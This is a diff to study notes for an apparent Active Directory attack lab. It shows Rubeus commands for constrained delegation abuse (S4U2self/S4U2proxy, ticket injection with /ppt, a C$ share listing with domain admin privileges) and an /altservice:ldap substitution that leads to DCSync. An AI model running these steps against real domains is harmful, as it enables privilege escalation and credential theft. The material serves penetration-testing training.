@@ -1304,16 +1304,33 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe
     /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" 
     /ppt
 
-# Result: 
+# Workflow:
 # 1. S4U2self: Get TGS for Administrator to websvc
-# 2. S4U2proxy: Use that TGS to request CIFS/dcorp-mssql TGS
-# 3. Access: dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+# 2. S4U2proxy: Use that TGS to request CIFS/dcorp-mssql TGS  
+# 3. Ticket injected via /ppt into Kerberos cache
+```
+
+**Step 2: Verify Ticket in Cache**
+```powershell
+C:\AD\Tools> klist
+
+# Expected output:
+# Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+# Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+# KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+```
+
+**Step 3: Access Target Service as Impersonated User**
+```powershell
+C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+# Returns directory listing with DA privileges
 ```
 
 **Key Mechanics:**
-- S4U2self: Request service ticket on behalf of user without needing their password
-- S4U2proxy: Use S4U2self ticket to request service ticket for delegated service
-- Requires: Original user account credentials or keys, target user, delegated SPN
+- S4U2self: Request service ticket on behalf of any user without their password/hash
+- S4U2proxy: Use the S4U2self ticket to request TGS for delegated service
+- Requires: AES256 (or NTLM) of delegating user, target user to impersonate, delegated SPN
 
 ---
 
@@ -1340,8 +1357,18 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe
     /altservice:ldap 
     /ptt
 
-# Result: LDAP/dcorp-dc TGS as Administrator
+# Execution flow:
+# 1. S4U2self: Get TGT for dcorp-adminsrv$
+# 2. S4U2proxy: Request TGS for time/dcorp-dc
+# 3. /altservice:ldap: Substitute with ldap service for same target
+# 4. Result: LDAP/dcorp-dc TGS as Administrator (bypasses delegation restriction)
 ```
+
+**Why /altservice Works:**
+- Machine is delegated only to TIME service
+- But /altservice:ldap bypasses this by requesting LDAP on same host (dcorp-dc)
+- LDAP service = admin access to DC = can perform DCSync
+- Effective technique for machines not delegated to LDAP directly
 
 #### Using TGS for DCSync
 ```powershell
